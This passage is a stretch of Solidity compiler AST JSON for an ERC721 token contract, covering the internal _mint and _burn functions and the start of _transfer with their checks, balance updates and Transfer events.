0"}],"id":605,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9323:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":604,"name":"address","nodeType":"ElementaryTypeName","src":"9323:7:1","typeDescriptions":{}}},"id":607,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9323:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":608,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":580,"src":"9335:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":609,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":582,"src":"9339:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"31","id":610,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9348:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"}],"id":603,"name":"_beforeTokenTransfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":984,"src":"9302:20:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256,uint256)"}},"id":611,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9302:48:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":612,"nodeType":"ExpressionStatement","src":"9302:48:1"},{"expression":{"arguments":[{"id":617,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"!","prefix":true,"src":"9445:17:1","subExpression":{"arguments":[{"id":615,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":582,"src":"9454:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":614,"name":"_exists","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":499,"src":"9446:7:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_bool_$","typeString":"function (uint256) view returns (bool)"}},"id":616,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9446:16:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a20746f6b656e20616c7265616479206d696e746564","id":618,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"9464:30:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57","typeString":"literal_string \"ERC721: token already minted\""},"value":"ERC721: token already minted"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57","typeString":"literal_string \"ERC721: token already minted\""}],"id":613,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"9437:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":619,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9437:58:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":620,"nodeType":"ExpressionStatement","src":"9437:58:1"},{"id":627,"nodeType":"UncheckedBlock","src":"9506:360:1","statements":[{"expression":{"id":625,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":621,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":89,"src":"9837:9:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":623,"indexExpression":{"id":622,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":580,"src":"9847:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"9837:13:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"31","id":624,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9854:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"9837:18:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":626,"nodeType":"ExpressionStatement","src":"9837:18:1"}]},{"expression":{"id":632,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":628,"name":"_owners","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":85,"src":"9876:7:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"}},"id":630,"indexExpression":{"id":629,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":582,"src":"9884:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"9876:16:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":631,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":580,"src":"9895:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"9876:21:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":633,"nodeType":"ExpressionStatement","src":"9876:21:1"},{"eventCall":{"arguments":[{"arguments":[{"hexValue":"30","id":637,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9930:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":636,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9922:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":635,"name":"address","nodeType":"ElementaryTypeName","src":"9922:7:1","typeDescriptions":{}}},"id":638,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9922:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":639,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":580,"src":"9934:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":640,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":582,"src":"9938:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":634,"name":"Transfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1013,"src":"9913:8:1","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":641,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9913:33:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":642,"nodeType":"EmitStatement","src":"9908:38:1"},{"expression":{"arguments":[{"arguments":[{"hexValue":"30","id":646,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9985:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":645,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9977:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":644,"name":"address","nodeType":"ElementaryTypeName","src":"9977:7:1","typeDescriptions":{}}},"id":647,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9977:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":648,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":580,"src":"9989:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":649,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":582,"src":"9993:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"31","id":650,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10002:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"}],"id":643,"name":"_afterTokenTransfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":997,"src":"9957:19:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256,uint256)"}},"id":651,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9957:47:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":652,"nodeType":"ExpressionStatement","src":"9957:47:1"}]},"documentation":{"id":578,"nodeType":"StructuredDocumentation","src":"8775:311:1","text":" @dev Mints `tokenId` and transfers it to `to`.\n WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\n Requirements:\n - `tokenId` must not exist.\n - `to` cannot be the zero address.\n Emits a {Transfer} event."},"id":654,"implemented":true,"kind":"function","modifiers":[],"name":"_mint","nameLocation":"9100:5:1","nodeType":"FunctionDefinition","parameters":{"id":583,"nodeType":"ParameterList","parameters":[{"constant":false,"id":580,"mutability":"mutable","name":"to","nameLocation":"9114:2:1","nodeType":"VariableDeclaration","scope":654,"src":"9106:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":579,"name":"address","nodeType":"ElementaryTypeName","src":"9106:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":582,"mutability":"mutable","name":"tokenId","nameLocation":"9126:7:1","nodeType":"VariableDeclaration","scope":654,"src":"9118:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":581,"name":"uint256","nodeType":"ElementaryTypeName","src":"9118:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"9105:29:1"},"returnParameters":{"id":584,"nodeType":"ParameterList","parameters":[],"src":"9152:0:1"},"scope":998,"src":"9091:920:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":720,"nodeType":"Block","src":"10386:713:1","statements":[{"assignments":[661],"declarations":[{"constant":false,"id":661,"mutability":"mutable","name":"owner","nameLocation":"10404:5:1","nodeType":"VariableDeclaration","scope":720,"src":"10396:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":660,"name":"address","nodeType":"ElementaryTypeName","src":"10396:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":666,"initialValue":{"arguments":[{"id":664,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":657,"src":"10427:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":662,"name":"ERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":998,"src":"10412:6:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ERC721_$998_$","typeString":"type(contract ERC721)"}},"id":663,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"ownerOf","nodeType":"MemberAccess","referencedDeclaration":199,"src":"10412:14:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":665,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"10412:23:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"10396:39:1"},{"expression":{"arguments":[{"id":668,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":661,"src":"10467:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"arguments":[{"hexValue":"30","id":671,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10482:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":670,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10474:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":669,"name":"address","nodeType":"ElementaryTypeName","src":"10474:7:1","typeDescriptions":{}}},"id":672,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"10474:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":673,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":657,"src":"10486:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"31","id":674,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10495:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"}],"id":667,"name":"_beforeTokenTransfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":984,"src":"10446:20:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256,uint256)"}},"id":675,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"10446:51:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":676,"nodeType":"ExpressionStatement","src":"10446:51:1"},{"expression":{"id":682,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":677,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":661,"src":"10599:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":680,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":657,"src":"10622:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":678,"name":"ERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":998,"src":"10607:6:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ERC721_$998_$","typeString":"type(contract ERC721)"}},"id":679,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"ownerOf","nodeType":"MemberAccess","referencedDeclaration":199,"src":"10607:14:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":681,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"10607:23:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"10599:31:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":683,"nodeType":"ExpressionStatement","src":"10599:31:1"},{"expression":{"id":687,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"delete","prefix":true,"src":"10668:31:1","subExpression":{"baseExpression":{"id":684,"name":"_tokenApprovals","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":93,"src":"10675:15:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"}},"id":686,"indexExpression":{"id":685,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":657,"src":"10691:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"10675:24:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":688,"nodeType":"ExpressionStatement","src":"10668:31:1"},{"id":695,"nodeType":"UncheckedBlock","src":"10710:237:1","statements":[{"expression":{"id":693,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":689,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":89,"src":"10915:9:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":691,"indexExpression":{"id":690,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":661,"src":"10925:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"10915:16:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"-=","rightHandSide":{"hexValue":"31","id":692,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10935:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"10915:21:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":694,"nodeType":"ExpressionStatement","src":"10915:21:1"}]},{"expression":{"id":699,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"delete","prefix":true,"src":"10956:23:1","subExpression":{"baseExpression":{"id":696,"name":"_owners","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":85,"src":"10963:7:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"}},"id":698,"indexExpression":{"id":697,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":657,"src":"10971:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"10963:16:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":700,"nodeType":"ExpressionStatement","src":"10956:23:1"},{"eventCall":{"arguments":[{"id":702,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":661,"src":"11004:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"arguments":[{"hexValue":"30","id":705,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11019:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":704,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"11011:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":703,"name":"address","nodeType":"ElementaryTypeName","src":"11011:7:1","typeDescriptions":{}}},"id":706,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11011:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":707,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":657,"src":"11023:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":701,"name":"Transfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1013,"src":"10995:8:1","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":708,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"10995:36:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":709,"nodeType":"EmitStatement","src":"10990:41:1"},{"expression":{"arguments":[{"id":711,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":661,"src":"11062:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"arguments":[{"hexValue":"30","id":714,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11077:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":713,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"11069:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":712,"name":"address","nodeType":"ElementaryTypeName","src":"11069:7:1","typeDescriptions":{}}},"id":715,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11069:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":716,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":657,"src":"11081:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"31","id":717,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11090:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"}],"id":710,"name":"_afterTokenTransfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":997,"src":"11042:19:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256,uint256)"}},"id":718,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11042:50:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":719,"nodeType":"ExpressionStatement","src":"11042:50:1"}]},"documentation":{"id":655,"nodeType":"StructuredDocumentation","src":"10017:315:1","text":" @dev Destroys `tokenId`.\n The approval is cleared when the token is burned.\n This is an internal function that does not check if the sender is authorized to operate on the token.\n Requirements:\n - `tokenId` must exist.\n Emits a {Transfer} event."},"id":721,"implemented":true,"kind":"function","modifiers":[],"name":"_burn","nameLocation":"10346:5:1","nodeType":"FunctionDefinition","parameters":{"id":658,"nodeType":"ParameterList","parameters":[{"constant":false,"id":657,"mutability":"mutable","name":"tokenId","nameLocation":"10360:7:1","nodeType":"VariableDeclaration","scope":721,"src":"10352:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":656,"name":"uint256","nodeType":"ElementaryTypeName","src":"10352:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10351:17:1"},"returnParameters":{"id":659,"nodeType":"ParameterList","parameters":[],"src":"10386:0:1"},"scope":998,"src":"10337:762:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":805,"nodeType":"Block","src":"11532:1124:1","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":737,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":734,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"11565:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":732,"name":"ERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":998,"src":"11550:6:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ERC721_$998_$","typeString":"type(contract ERC721)"}},"id":733,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"ownerOf","nodeType":"MemberAccess","referencedDeclaration":199,"src":"11550:14:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":735,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11550:23:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":736,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":724,"src":"11577:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"11550:31:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a207472616e736665722066726f6d20696e636f7272656374206f776e6572","id":738,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"11583:39:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","typeString":"literal_string \"ERC721: transfer from incorrect owner\""},"value":"ERC721: transfer from incorrect owner"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","typeString":"literal_string \"ERC721: transfer from incorrect 